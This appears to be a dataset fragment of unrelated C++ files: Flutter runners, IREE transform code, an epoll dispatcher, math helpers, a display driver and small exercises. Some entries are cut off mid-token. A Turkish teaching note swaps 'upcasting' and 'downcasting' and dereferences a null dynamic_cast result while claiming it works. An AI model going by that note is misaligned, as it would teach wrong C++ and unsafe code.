    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_nextauth_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "// Copyright 2021 The IREE Authors\n//\n// Licensed under the Apache License v2.0 with LLVM Exceptions.\n// See https://llvm.org/LICENSE.txt for license information.\n// SPDX-License-Identifier: Apache-2.0 WITH LLVM-exception\n\n#include \"iree-dialects/Dialect/LinalgTransform/TransformOpInterface.h\"\n\n#include \"llvm/ADT/SmallPtrSet.h\"\n\nusing namespace mlir;\nusing namespace mlir::linalg;\n\n//===----------------------------------------------------------------------===//\n// TransformState\n//===----------------------------------------------------------------------===//\n\nconstexpr const Value transform::TransformState::kTopLevelValue;\n\ntransform::TransformState::TransformState(Operation *root) {\n  operations[kTopLevelValue].push_back(root);\n}\n\nOperation *transform::TransformState::getTopLevel() const {\n  return operations.lookup(kTopLevelValue).front();\n}\n\nArrayRef<Operation *>\ntransform::TransformState::getPayloadOps(Value value) const {\n  auto iter = operations.find(value);\n  assert(iter != operations.end() && \"unknown handle\");\n  return iter->getSecond();\n}\n\nLogicalResult\ntransform::TransformState::setPayloadOps(Value value,\n                                         ArrayRef<Operation *> targets) {\n  assert(value != kTopLevelValue &&\n         \"attempting to reset the transformation root\");\n\n  if (value.use_empty())\n    return success();\n\n  SmallVector<Operation *> storedTargets(targets.begin(), targets.end());\n  bool inserted = operations.insert({value, std::move(storedTargets)}).second;\n  assert(inserted && \"value is already associated with another list\");\n  (void)inserted;\n\n  const SmallVector<Operation *> &currentOperationList =\n      operations.lookup(value);\n  llvm::SmallPtrSet<Operation *, 4> currentOperationSet(\n      currentOperationList.begin(), currentOperationList.end());\n  for (const auto &kvp : operations) {\n    if (kvp.getFirst() == value)\n      continue;\n    for (Operation *trackedOp : kvp.getSecond()) {\n      if (currentOperationSet.contains(trackedOp)) {\n        InFlightDiagnostic diag = trackedOp->emitError()\n                                  << \"operation tracked by two handles\";\n        diag.attachNote(value.getLoc()) << \"handle\";\n        diag.attachNote(kvp.getFirst().getLoc()) << \"handle\";\n        return diag;\n      }\n    }\n  }\n\n  for (const auto &keyedExtension : extensions)\n    keyedExtension.getSecond()->sendNotifySetPayload(value, targets);\n\n  return success();\n}\n\nvoid transform::TransformState::removePayloadOps(Value value) {\n  auto it = operations.find(value);\n  if (it == operations.end())\n    return;\n\n  for (const auto &keyedExtension : extensions)\n    keyedExtension.getSecond()->sendNotifyRemovePayload(value, it->getSecond());\n\n  operations.erase(it);\n}\n\nvoid transform::TransformState::updatePayloadOps(\n    Value value, function_ref<Operation *(Operation *)> callback) {\n  auto it = operations.find(value);\n  assert(it != operations.end() && \"unknown handle\");\n  SmallVector<Operation *> &association = it->getSecond();\n  SmallVector<Operation *> updated;\n  updated.reserve(association.size());\n\n  for (Operation *op : association)\n    if (Operation *updatedOp = callback(op))\n      updated.push_back(updatedOp);\n\n  for (const auto &keyedExtension : extensions)\n    keyedExtension.getSecond()->sendNotifyUpdatePayload(value, association,\n                                                        updated);\n\n  std::swap(association, updated);\n}\n\nLogicalResult\ntransform::TransformState::applyTransform(TransformOpInterface transform) {\n  transform::TransformResults results(transform->getNumResults());\n  if (failed(transform.apply(results, *this)))\n    return failure();\n\n  for (Value target : transform->getOperands())\n    removePayloadOps(target);\n\n  for (auto en : llvm::enumerate(transform->getResults()))\n    if (failed(setPayloadOps(en.value(), results.get(en.index()))))\n      return failure();\n\n  return success();\n}\n\n// Out-of-line definition to ensure vtable and metadata are emitted to a single\n// .o file.\ntransform::TransformState::Extension::~Extension() {}\n\n//===----------------------------------------------------------------------===//\n// TransformResults\n//===----------------------------------------------------------------------===//\n\ntransform::TransformResults::TransformResults(unsigned numSegments) {\n  segments.resize(numSegments,\n                  ArrayRef<Operation *>(nullptr, static_cast<size_t>(0)));\n}\n\nvoid transform::TransformResults::set(OpResult value,\n                                      ArrayRef<Operation *> ops) {\n  unsigned position = value.getResultNumber();\n  assert(position < segments.size() &&\n         \"setting results for a non-existent handle\");\n  assert(segments[position].data() == nullptr && \"results already set\");\n  unsigned start = operations.size();\n  llvm::append_range(operations, ops);\n  segments[position] = makeArrayRef(operations).drop_front(start);\n}\n\nArrayRef<Operation *>\ntransform::TransformResults::get(unsigned position) const {\n  assert(position < segments.size(",
    "#include \"dispatcher.hpp\"\n#include \"signal_manager.hpp\"\n\n#include <unistd.h>\n#include <stdexcept>\n\n#ifdef __42_LIKES_WASTING_CPU_CYCLES__\n/* Initializes the `needsToWrite` flag to false */\nSink::Sink()\n{\n    needsToRead = false;\n    needsToWrite = false;\n}\n#endif // __42_LIKES_WASTING_CPU_CYCLES__\n\n/* Destructor for deriving classes */\nSink::~Sink()\n{\n}\n\n/* Constructs an event dispatcher using the given buffer size */\nDispatcher::Dispatcher(size_t bufferSize)\n    : _bufferSize(bufferSize)\n{\n    _buffer.resize(_bufferSize);\n\n#ifdef __42_LIKES_WASTING_CPU_CYCLES__\n    if ((_epollFileno = epoll_create(128)) < 0)\n        throw std::runtime_error(\"Unable to create epoll file descriptor\");\n#else\n    if ((_epollFileno = epoll_create1(EPOLL_CLOEXEC)) < 0)\n        throw std::runtime_error(\"Unable to create epoll file descriptor\");\n#endif // __42_LIKES_WASTING_CPU_CYCLES__\n}\n\n/* Releases the dispatcher's resources */\nDispatcher::~Dispatcher()\n{\n    close(_epollFileno);\n}\n\n/* Subscribes the an event sink to receive the given events on a file descriptor */\nvoid Dispatcher::subscribe(int fileno, uint32_t eventMask, Sink *sink)\n{\n    epoll_event event;\n\n    event.data.ptr = sink;\n    event.events   = eventMask;\n\n#ifdef __42_LIKES_WASTING_CPU_CYCLES__\n    event.events |= EPOLLIN | EPOLLOUT;\n#endif // __42_LIKES_WASTING_CPU_CYCLES__\n\n    if (epoll_ctl(_epollFileno, EPOLL_CTL_ADD, fileno, &event) != 0)\n        throw std::runtime_error(\"Unable to add file descriptor to poll\");\n\n#ifdef __42_LIKES_WASTING_CPU_CYCLES__\n    sink->needsToRead = (eventMask & EPOLLIN) == EPOLLIN;\n    sink->needsToWrite = (eventMask & EPOLLOUT) == EPOLLOUT;\n#endif // __42_LIKES_WASTING_CPU_CYCLES__\n}\n\n/* Changes the given file descriptor's received events and event sink */\nvoid Dispatcher::modify(int fileno, uint32_t eventMask, Sink *sink)\n{\n    epoll_event event;\n\n    event.data.ptr = sink;\n    event.events   = eventMask;\n\n#ifdef __42_LIKES_WASTING_CPU_CYCLES__\n    event.events |= EPOLLIN | EPOLLOUT;\n#endif // __42_LIKES_WASTING_CPU_CYCLES__\n\n    if (epoll_ctl(_epollFileno, EPOLL_CTL_MOD, fileno, &event) != 0)\n        throw std::runtime_error(\"Unable to modify file descriptor on poll\");\n\n#ifdef __42_LIKES_WASTING_CPU_CYCLES__\n    sink->needsToRead = (eventMask & EPOLLIN) == EPOLLIN;\n    sink->needsToWrite = (eventMask & EPOLLOUT) == EPOLLOUT;\n#endif // __42_LIKES_WASTING_CPU_CYCLES__\n}\n\n/* Unsubscribes the given file descriptor's event sink from receiving events */\nvoid Dispatcher::unsubscribe(int fileno)\n{\n    epoll_event event;\n\n    event.data.ptr = NULL;\n    event.events   = 0;\n\n    if (epoll_ctl(_epollFileno, EPOLL_CTL_DEL, fileno, &event) != 0)\n        throw std::runtime_error(\"Unable to remove file descriptor from poll\");\n}\n\n/* Waits (in the given timeout) for events to occur and dispatches them */\nvoid Dispatcher::dispatch(int timeout)\n{\n    _buffer.resize(_bufferSize);\n\n    int count = epoll_wait(_epollFileno, _buffer.data(), _bufferSize, timeout);\n    if (SignalManager::shouldQuit())\n        return;\n    if (count < 0)\n        throw std::runtime_error(\"Unable to wait for events to occur\");\n\n    _buffer.resize(static_cast<size_t>(static_cast<unsigned int>(count)));\n\n    for (EventBuffer::iterator event = _buffer.begin(); event != _buffer.end(); event++)\n    {\n        Sink *sink = static_cast<Sink *>(event->data.ptr);\n        try\n        {\n            uint32_t eventMask = event->events;\n\n#ifdef __42_LIKES_WASTING_CPU_CYCLES__\n            if (!sink->needsToRead)\n                eventMask &= ~EPOLLIN;\n            if (!sink->needsToWrite)\n                eventMask &= ~EPOLLOUT;\n#endif // __42_LIKES_WASTING_CPU_CYCLES__\n\n            if ((eventMask & (EPOLLIN | EPOLLOUT | EPOLLHUP)) != 0)\n                sink->handleEvents(eventMask);\n        } catch (const std::exception &exception)\n        {\n            sink->handleException(exception.what());\n        } catch (...)\n        {\n            sink->handleException(\"Thrown type is not derived from std::exception\");\n        }\n    }\n}\n",
    "/*-------------------------------------------------------\ndynamic_cast operat\u00f6r\u00fcn\u00fcn neden sadece taban s\u0131n\u0131f virtual\niken \u00e7al\u0131\u015ft\u0131\u011f\u0131n\u0131 ara\u015ft\u0131r. (Muhtemel taban s\u0131n\u0131f\u0131n dtoru\n\u00e7a\u011fr\u0131lmamas\u0131 durumundan korunmak i\u00e7in ama gene de ara\u015ft\u0131r.)\nAnahtar Notlar: Taban s\u0131n\u0131ftan t\u00fcremi\u015f s\u0131n\u0131fa do\u011frudan\nd\u00f6n\u00fc\u015f\u00fcm ger\u00e7ekle\u015ftirilemez. Bu do\u011frudan sentaks hatas\u0131na neden\nolur. Ancak t\u00fcremi\u015f s\u0131n\u0131ftan taban s\u0131n\u0131fa atama yap\u0131l\u0131rken\nherhangi bir s\u0131k\u0131nt\u0131 olmaz. Bu ataman\u0131n di\u011fer bir ismi ise\ndowncasting olarak adland\u0131r\u0131l\u0131r. Downcasting denilmesinin\nsebebi ise taban s\u0131n\u0131f\u0131n \u015fematik olarak t\u00fcremi\u015f s\u0131n\u0131f\u0131n\n\u00fczerinde oldu\u011fundan taban s\u0131n\u0131fa bir atama s\u00f6z konusu oldu\u011funda\na\u015fa\u011f\u0131 do\u011fru gitme s\u00f6z konusudur. Bu sebeple buna downcasting\ndenilmektedir. Tersi durumunda t\u00fcremi\u015f s\u0131n\u0131f t\u00fcr\u00fcnden bir nesnenin\ntaban s\u0131n\u0131f t\u00fcr\u00fcnden bir nesneye atanmas\u0131nda herhangi bir s\u0131k\u0131nt\u0131 olmamas\u0131na\nkar\u015f\u0131n, bu kez yukar\u0131 do\u011fru bir hareket oldu\u011fu i\u00e7in buna upcasting denilmektedir.\n--------------------------------------------------------*/\n#include <iostream>\n\nclass Base {\npublic:\n    Base() {\n        std::cout << \"Base ctor\" << '\\n';\n    }\n    virtual ~Base() {\n        std::cout << \"Bae dtor\\n\";\n    }\n};\n\nclass Derived : public Base {\npublic:\n    Derived() {\n        std::cout << \"Derived ctor\\n\";\n    }\n    ~Derived() {\n        std::cout << \"Derived dtor\\n\";\n    }\n    void func() {\n        std::cout << \"Derived::func()\\n\";\n    }\n};\n\nint main()\n{\n    Base* b = new Base();\n    Derived* d = dynamic_cast<Derived*>(b); //downcasting\n    d->func(); //Derived::func()\n}",
    "// Ram , sham and rahim went for shopping apple. They bought apple worth\r\n// 100 rupees. Ram paid 50 rupees, sham paid 30 rupees and rahim paid 20\r\n// rupees. Each apple is tagged with its weight on it. Write a program to\r\n// distribute apples such that the quantity of apple they get is in best\r\n// proportionate to the amount they paid.\r\n// Note : you cannot cut a apple into pieces have to allocate the whole apple to\r\n// one of them.\r\n// For example :\r\n// If there is 8 apple of 400g , 100g , 400g , 300g , 200g , 300g ,100g , 200g\r\n// then we can distribute them as\r\n// Ram : 400g , 400g , 200g (total 1kg , 50%)\r\n// Sham : 300g , 300g (tatal 600g , 30%)\r\n// rahim , 200g , 100g , 100g (tatal 400g , 20%)\r\n\r\n// Input:\r\n// Enter apple weight in gram (-1 to stop ) : 400\r\n// Enter apple weight in gram (-1 to stop ) : 100\r\n// Enter apple weight in gram (-1 to stop ) : 400\r\n// Enter apple weight in gram (-1 to stop ) : 300\r\n// Enter apple weight in gram (-1 to stop ) : 200\r\n// Enter apple weight in gram (-1 to stop ) : 300\r\n// Enter apple weight in gram (-1 to stop ) : 100\r\n// Enter apple weight in gram (-1 to stop ) : 200\r\n// Enter apple weight in gram (-1 to stop ) : -1\r\n\r\n// Output:\r\n// Ram : 400 400 100\r\n// Sham : 300 , 300\r\n// Rahim : 200 , 100 , 100\r\n\r\n#include <bits/stdc++.h>\r\nusing namespace std;\r\n\r\nstruct Person {\r\n    string name;\r\n    int amountPaid;\r\n    int totalWeight;\r\n    vector<int> apples;\r\n};\r\n\r\nbool compare(int a, int b) {\r\n    return a > b;\r\n}\r\nbool comp(Person* a,Person* b){\r\n    return (a->totalWeight * b->amountPaid) < (b->totalWeight * a->amountPaid);\r\n}\r\n\r\nint main() {\r\n    vector<int> appleWeights;\r\n    int weight;\r\n    \r\n    cout << \"Enter apple weight in gram (-1 to stop): \";\r\n    while (cin >> weight && weight != -1) {\r\n        appleWeights.push_back(weight);\r\n        cout << \"Enter apple weight in gram (-1 to stop): \";\r\n    }\r\n    \r\n    sort(appleWeights.begin(), appleWeights.end(), compare);\r\n    \r\n    Person ram = {\"Ram\", 50, 0, {}};\r\n    Person sham = {\"Sham\", 30, 0, {}};\r\n    Person rahim = {\"Rahim\", 20, 0, {}};\r\n    \r\n    vector<Person*> people = {&ram, &sham, &rahim};\r\n    \r\n    for (int apple : appleWeights) {\r\n        sort(people.begin(), people.end(),comp);\r\n        people[0]->apples.push_back(apple);\r\n        people[0]->totalWeight += apple;\r\n    }\r\n\r\n    cout << \"Ram: \";\r\n    for (int apple : ram.apples) cout << apple << \" \";\r\n    cout << endl;\r\n    \r\n    cout << \"Sham: \";\r\n    for (int apple : sham.apples) cout << apple << \" \";\r\n    cout << endl;\r\n    \r\n    cout << \"Rahim: \";\r\n    for (int apple : rahim.apples) cout << apple << \" \";\r\n    cout << endl;\r\n    return 0;\r\n}\r\n\r\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"news_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/**\n * *********************************************************\n *\n * @file: math_helper.cpp\n * @brief: Contains common/commonly used math function\n * @author: Yang Haodong\n * @date: 2024-01-03\n * @version: 1.2\n *\n * Copyright (c) 2024, Yang Haodong.\n * All rights reserved.\n *\n * --------------------------------------------------------\n *\n * ********************************************************\n */\n#include \"math_helper.h\"\n\nnamespace helper\n{\n/**\n * @brief Calculate distance between the 2 nodes.\n * @param n1 Node 1\n * @param n2 Node 2\n * @return distance between nodes\n */\ndouble dist(const Node& node1, const Node& node2)\n{\n  return std::hypot(node1.x_ - node2.x_, node1.y_ - node2.y_);\n}\n\ndouble dist(const std::pair<double, double>& node1, const std::pair<double, double>& node2)\n{\n  return std::hypot(node1.first - node2.first, node1.second - node2.second);\n}\n\ndouble dist(const Eigen::Vector2d& point1, const Eigen::Vector2d& point2)\n{\n  return std::hypot(point1.x() - point2.x(), point1.y() - point2.y());\n}\n\ndouble dist(const geometry_msgs::msg::PoseStamped& node1, const geometry_msgs::msg::PoseStamped& node2)\n{\n  return std::hypot(node1.pose.position.x - node2.pose.position.x, node1.pose.position.y - node2.pose.position.y);\n}\n\n/**\n * @brief Calculate the angle of x-axis between the 2 nodes.\n * @param n1 Node 1\n * @param n2 Node 2\n * @return the angle of x-axis between the 2 node\n */\ndouble angle(const Node& node1, const Node& node2)\n{\n  return atan2(node2.y_ - node1.y_, node2.x_ - node1.x_);\n}\n\ndouble angle(const std::pair<double, double>& node1, const std::pair<double, double>& node2)\n{\n  return atan2(node2.second - node1.second, node2.first - node1.first);\n}\n\ndouble angle(const geometry_msgs::msg::PoseStamped& node1, const geometry_msgs::msg::PoseStamped& node2)\n{\n  return atan2(node2.pose.position.y - node1.pose.position.y, node2.pose.position.x - node1.pose.position.x);\n}\n/**\n * @brief Perform modulus operation on 2\u03c0.\n * @param theta    the angle to modulu\n * @return theta_m the angle after modulus operator\n */\ndouble mod2pi(double theta)\n{\n  return theta - 2.0 * M_PI * floor(theta / M_PI / 2.0);\n}\n\n/**\n * @brief Truncate the angle to the interval of -\u03c0 to \u03c0.\n * @param theta    the angle to truncate\n * @return theta_t the truncated angle\n */\ndouble pi2pi(double theta)\n{\n  while (theta > M_PI)\n    theta -= 2.0 * M_PI;\n  while (theta < -M_PI)\n    theta += 2.0 * M_PI;\n  return theta;\n}\n\n/**\n * @brief Formula for intersection of a line with a circle centered at the origin\n * @note  https://mathworld.wolfram.com/Circle-LineIntersection.html\n * @param p1/p2     the two point in the segment\n * @param r         the radius of circle centered at the origin\n * @return points   the intersection points of a line and the circle\n */\nstd::vector<std::pair<double, double>> circleSegmentIntersection(const std::pair<double, double>& p1,\n                                                                 const std::pair<double, double>& p2, double r)\n{\n  std::vector<std::pair<double, double>> i_points;\n\n  double x1 = p1.first;\n  double x2 = p2.first;\n  double y1 = p1.second;\n  double y2 = p2.second;\n\n  double dx = x2 - x1;\n  double dy = y2 - y1;\n  double dr2 = dx * dx + dy * dy;\n  double D = x1 * y2 - x2 * y1;\n\n  // the first element is the point within segment\n  double d1 = x1 * x1 + y1 * y1;\n  double d2 = x2 * x2 + y2 * y2;\n  double dd = d2 - d1;\n\n  double delta = std::sqrt(r * r * dr2 - D * D);\n\n  if (delta >= 0)\n  {\n    if (delta == 0)\n      i_points.emplace_back(D * dy / dr2, -D * dx / dr2);\n    else\n    {\n      i_points.emplace_back((D * dy + std::copysign(1.0, dd) * dx * delta) / dr2,\n                            (-D * dx + std::copysign(1.0, dd) * dy * delta) / dr2);\n      i_points.emplace_back((D * dy - std::copysign(1.0, dd) * dx * delta) / dr2,\n                            (-D * dx - std::copysign(1.0, dd) * dy * delta) / dr2);\n    }\n  }\n\n  return i_points;\n}\n}  // namespace helper",
    "#include \"ast-tblgen/Components.hpp\"\n\nnamespace astgen {\n\nvoid Type::print(Printer &printer) const {\n  printer.OS() << getName();\n  if (!typeArgs.empty()) {\n    printer.OS() << '<';\n    for (auto I = getTypeArgs().begin(), E = getTypeArgs().end(); I != E; ++I) {\n      if (I != getTypeArgs().begin())\n        printer.OS() << \", \";\n      (*I)->print(printer);\n    }\n    printer.OS() << '>';\n  }\n  if (isPtr)\n    printer.OS() << \" *\";\n}\n\nvoid Var::print(Printer &printer) const {\n  getType()->print(printer);\n  printer.OS() << ' ' << getName();\n}\n\nvoid Method::print(Printer &printer) const {\n  if (getMethodKind() == Method::Static)\n    printer.OS() << \"static \";\n\n  retType->print(printer);\n  printer.OS() << ' ' << getName() << '(';\n\n  for (auto I = getParams().begin(), E = getParams().end(); I != E; ++I) {\n    if (I != getParams().begin())\n      printer.OS() << \", \";\n    (*I)->print(printer);\n  }\n\n  printer.OS() << \")\";\n\n  if (getMethodKind() == Method::Const)\n    printer.OS() << \" const\";\n}\n\nvoid Region::print(Printer &printer) const {\n  printer.OS() << (getIsPublic() ? \"public:\" : \"private:\");\n  Printer::AddIndentScope scope(printer, 2);\n  for (const auto &var : getMembers()) {\n    printer.LN();\n    std::visit([&]<typename T>(const T *val) { val->print(printer); }, var);\n    printer.OS() << ';';\n  }\n}\n\nvoid Class::print(Printer &printer) const {\n  printer.OS() << \"class \" << getClassName();\n  if (getInheritClass()) {\n    printer.OS() << \" : public \";\n    getInheritClass()->print(printer);\n  }\n  printer.OS() << \" {\";\n  for (auto *region : getRegions()) {\n    printer.LN();\n    region->print(printer);\n  }\n\n  printer.LN() << \"};\";\n  printer.LN();\n}\n\n} // namespace astgen\n",
    "#include \"NT35510_t4x_p.h\"\n#include \"NT35510_t4x_p_default_flexio_pins.h\"\n\n\n#if !defined(__IMXRT1062__)\n#warning This library only supports the Teensy 4.x\n#endif\n\n//#define DEBUG\n#define DEBUG_VERBOSE\n\n#ifndef DEBUG\n#undef DEBUG_VERBOSE\nvoid inline DBGPrintf(...){};\nvoid inline DBGWrite(uint8_t ch) {};\nvoid inline DBGFlush(){};\n#else\n#define DBGPrintf Serial.printf\n#define DBGFlush Serial.flush\n#define DBGWrite Serial.write\n#endif\n\n#ifndef DEBUG_VERBOSE\nvoid inline VDBGPrintf(...){};\n#else\n#define VDBGPrintf Serial.printf\n#endif\n\n\n\n//--------------------------------------------------\n\nFLASHMEM NT35510_t4x_p::NT35510_t4x_p(int8_t dc, int8_t cs, int8_t rst)\n    : Teensy_Parallel_GFX(_TFTWIDTH, _TFTHEIGHT), _dc(dc), _cs(cs), _rst(rst),\n      _data_pins{DISPLAY_D0, DISPLAY_D1, DISPLAY_D2, DISPLAY_D3, DISPLAY_D4, DISPLAY_D5, DISPLAY_D6, DISPLAY_D7,\n  #if defined(DISPLAY_D8)\n      DISPLAY_D8, DISPLAY_D9, DISPLAY_D10, DISPLAY_D11, DISPLAY_D12, DISPLAY_D13, DISPLAY_D14, DISPLAY_D15}, \n#else\n      0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff},\n#endif      \n      _wr_pin(DISPLAY_WR), _rd_pin(DISPLAY_RD) {\n}\n\nFLASHMEM void NT35510_t4x_p::begin(uint8_t display_name, uint8_t baud_speed_mhz) {\n    // DBGPrintf(\"Bus speed: %d Mhz \\n\", baud_speed_mhz);\n\n    _display_name = display_name;\n\n    switch (baud_speed_mhz) {\n    case 2:\n        _baud_div = 120;\n        break;\n    case 4:\n        _baud_div = 60;\n        break;\n    case 8:\n        _baud_div = 30;\n        break;\n    case 12:\n        _baud_div = 20;\n        break;\n    case 20:\n        _baud_div = 12;\n        break;\n    case 24:\n        _baud_div = 10;\n        break;\n    case 30:\n        _baud_div = 8;\n        break;\n    case 40:\n        _baud_div = 6;\n        break;\n    default:\n        _baud_div = 20; // 12Mhz\n        break;\n    }\n    DBGPrintf(\"Bus speed: %d Mhz Div: %d\\n\", baud_speed_mhz, _baud_div);\n    DBGPrintf(\"CS:%u DC:%u RST:%u\\n\", _cs, _dc, _rst);\n    pinMode(_cs, OUTPUT);  // CS\n    pinMode(_dc, OUTPUT);  // DC\n    pinMode(_rst, OUTPUT); // RST\n\n    *(portControlRegister(_cs)) = 0xFF;\n    *(portControlRegister(_dc)) = 0xFF;\n    *(portControlRegister(_rst)) = 0xFF;\n\n    digitalWriteFast(_cs, HIGH);\n    digitalWriteFast(_dc, HIGH);\n    digitalWriteFast(_rst, HIGH);\n\n    delay(200);\n    digitalWrite(_rst, LOW);\n    delay(300);\n    digitalWriteFast(_rst, HIGH);\n    delay(300);\n\n    FlexIO_Init();\n\n    displayInit(display_name);\n\n    setBitDepth(_bitDepth);\n    /*\n    setTearingEffect(_bTearingOn);\n    if (_bTearingOn == true) {\n      setTearingScanLine(_tearingScanLine);\n    }\n    setFrameRate(_frameRate);\n    */\n\n    _width = _TFTWIDTH;\n    _height = _TFTHEIGHT;\n\n    setClipRect();\n    setOrigin();\n    setTextSize(1);\n}\n\nFLASHMEM uint8_t NT35510_t4x_p::setBitDepth(uint8_t bitDepth) {\n    uint8_t bd;\n\n    switch (bitDepth) {\n    case 16:\n        _bitDepth = 16;\n        bd = 0x55;\n        break;\n    case 18:\n        _bitDepth = 18;\n        bd = 0x66;\n        break;\n    case 24: // Unsupported\n        _bitDepth = 24;\n        bd = 0x77;\n        break;\n    default: // Unsupported\n        return _bitDepth;\n        break;\n    }\n\n    //SglBeatWR_nPrm_8(NT35510_COLMOD, &bd, 1);\n    write_command_and_data(NT35510_COLMOD, bd);\n\n    // Insert small delay here as rapid calls appear to fail\n    delay(10);\n\n    return _bitDepth;\n}\n\nFLASHMEM uint8_t NT35510_t4x_p::getBitDepth() {\n    return _bitDepth;\n}\n\nFLASHMEM void NT35510_t4x_p::setFrameRate(uint8_t frRate) {\n    _frameRate = frRate;\n#ifdef LATER\n\n    uint8_t fr28Hz[2] = {0x00, 0x11}; // 28.78fps, 17 clocks\n    uint8_t fr30Hz[2] = {0x10, 0x11}; // 30.38fps, 17 clocks\n    uint8_t fr39Hz[2] = {0x50, 0x11}; // 39.06fps, 17 clocks\n    uint8_t fr45Hz[2] = {0x70, 0x11}; // 45.57fps, 17 clocks\n    uint8_t fr54Hz[2] = {0x90, 0x11}; // 54.69ps, 17 clocks\n    uint8_t fr60Hz[2] = {0xA0, 0x11}; // 60.76fps, 17 clocks\n    uint8_t fr68Hz[2] = {0xB0, 0x11}; // 68.36fps, 17 clocks (ILI9488 default)\n    uint8_t fr78Hz[2] = {0xC0, 0x11}; // 78.13fps, 17 clocks\n    uint8_t fr91Hz[2] = {0xD0, 0x11}; // 91.15fps, 17 clocks\n\n    uint8_t frData[2];\n    // Select parameters for frame rate\n    switch (frRate) {\n    case 28:\n        memcpy(frData, fr28Hz, sizeof fr28Hz);\n        break;\n    case 30:\n        memcpy(frData, fr30Hz, sizeof fr30Hz);\n        break;\n    case 39:\n        memcpy(frData, fr39Hz, sizeof fr39Hz);\n        break;\n    case 45:\n        memcpy(frData, fr45Hz, sizeof fr45Hz);\n        break;\n    case 54:\n        memcpy(frData, fr54Hz, sizeof fr54Hz);\n        break;\n    case 60:\n        memcpy(frData, fr60Hz, sizeof fr60Hz);\n        break;\n    case 68:\n        memcpy(frData, fr68Hz, sizeof fr68Hz);\n        break;\n    case 78:\n        memcpy(frData, fr78Hz, sizeof fr78Hz);\n        break;\n    case 91:\n        memcpy(frData, fr91Hz, sizeof fr91Hz);\n        break;\n    default:\n        memcpy(frData, fr60Hz, sizeof fr60Hz);\n        _frameRate = 60;\n        break;\n    }\n\n    SglBeatWR_nPrm_8(NT35510_FRMCTR1, frData, 2);\n#endif\n}\n\nFLASHME",
    "#include \"flutter_window.h\"\r\n\r\n#include <optional>\r\n\r\n#include \"flutter/generated_plugin_registrant.h\"\r\n\r\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\r\n    : project_(project) {}\r\n\r\nFlutterWindow::~FlutterWindow() {}\r\n\r\nbool FlutterWindow::OnCreate() {\r\n  if (!Win32Window::OnCreate()) {\r\n    return false;\r\n  }\r\n\r\n  RECT frame = GetClientArea();\r\n\r\n  // The size here must match the window dimensions to avoid unnecessary surface\r\n  // creation / destruction in the startup path.\r\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\r\n      frame.right - frame.left, frame.bottom - frame.top, project_);\r\n  // Ensure that basic setup of the controller was successful.\r\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\r\n    return false;\r\n  }\r\n  RegisterPlugins(flutter_controller_->engine());\r\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\r\n\r\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\r\n    this->Show();\r\n  });\r\n\r\n  // Flutter can complete the first frame before the \"show window\" callback is\r\n  // registered. The following call ensures a frame is pending to ensure the\r\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\r\n  flutter_controller_->ForceRedraw();\r\n\r\n  return true;\r\n}\r\n\r\nvoid FlutterWindow::OnDestroy() {\r\n  if (flutter_controller_) {\r\n    flutter_controller_ = nullptr;\r\n  }\r\n\r\n  Win32Window::OnDestroy();\r\n}\r\n\r\nLRESULT\r\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\r\n                              WPARAM const wparam,\r\n                              LPARAM const lparam) noexcept {\r\n  // Give Flutter, including plugins, an opportunity to handle window messages.\r\n  if (flutter_controller_) {\r\n    std::optional<LRESULT> result =\r\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\r\n                                                      lparam);\r\n    if (result) {\r\n      return *result;\r\n    }\r\n  }\r\n\r\n  switch (message) {\r\n    case WM_FONTCHANGE:\r\n      flutter_controller_->engine()->ReloadSystemFonts();\r\n      break;\r\n  }\r\n\r\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\r\n}\r\n",
